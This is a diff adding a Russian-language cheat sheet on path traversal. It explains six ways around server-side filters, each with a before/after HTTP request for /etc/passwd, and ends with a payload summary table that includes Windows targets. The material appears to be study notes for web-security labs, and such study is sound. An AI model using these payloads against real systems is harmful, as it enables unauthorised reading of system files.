@@ -1,0 +1,95 @@
+1. Simple Case (Базовый обход)
+Описание: Нет никакой фильтрации со стороны сервера.
+
+Механика: Переход на несколько уровней вверх по дереву каталогов до корня /.
+
+До:
+
+HTTP
+GET /image?filename=60.jpg HTTP/1.1
+После:
+
+HTTP
+GET /image?filename=../../../etc/passwd HTTP/1.1
+2. Absolute Path Bypass (Обход абсолютным путем)
+Описание: Блокируются последовательности ../.
+
+Механика: Обращение к файлу напрямую от корневого каталога / без использования ../.
+
+До:
+
+HTTP
+GET /image?filename=60.jpg HTTP/1.1
+После:
+
+HTTP
+GET /image?filename=/etc/passwd HTTP/1.1
+3. Non-Recursive Stripping (Нерекурсивная очистка)
+Описание: Фильтр удаляет ../ один раз (однопроходная очистка).
+
+Механика: Внедрение маскированных ....// или ....\/. После того как внутренний ../ удалится, оставшиеся части образуют новый ../.
+
+До:
+
+HTTP
+GET /image?filename=60.jpg HTTP/1.1
+После:
+
+HTTP
+GET /image?filename=....//....//....//etc/passwd HTTP/1.1
+4. Superfluous URL-Decode (Двойное URL-кодирование)
+Описание: Фильтр проверяет запрос после 1-го декодирования, но сервер декодирует его второй раз перед вызовом файла.
+
+Механика: Символы . и / кодируются дважды (% -> %25).
+
+. 
+→ %2e 
+→ %252e
+
+/ 
+→ %2f 
+→ %252f
+
+До:
+
+HTTP
+GET /image?filename=60.jpg HTTP/1.1
+После:
+
+HTTP
+GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1
+5. Validation of Start of Path (Проверка начала пути)
+Описание: Приложение проверяет, начинается ли путь с ожидаемого базового каталога (например, /var/www/images/).
+
+Механика: Оставить валидную префиксную директорию и сразу за ней подняться вверх.
+
+До:
+
+HTTP
+GET /image?filename=60.jpg HTTP/1.1
+После:
+
+HTTP
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+6. Null Byte Bypass (Обход через NULL-байт %00)
+Описание: Сервер требует конкретное расширение файла (например, .jpg).
+
+Механика: Символ %00 (\0) завершает строку для C/Unix-вызовов файловой системы, отбрасывая всё, что идет после него.
+
+До:
+
+HTTP
+GET /image?filename=60.jpg HTTP/1.1
+После:
+
+HTTP
+GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+⚡ Quick Reference / Payload Summary
+Уязвимость / Защита	Пейлоад (Payload)
+Simple	../../../etc/passwd
+Absolute Path	/etc/passwd
+Stripped Non-Recursively	....//....//....//etc/passwd
+Superfluous URL-Decode	%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+Start Path Validation	/var/www/images/../../../etc/passwd
+Extension Validation	../../../etc/passwd%00.jpg
+Windows Target (Win/DOS)	..\..\..\windows\win.ini или c:\windows\win.ini
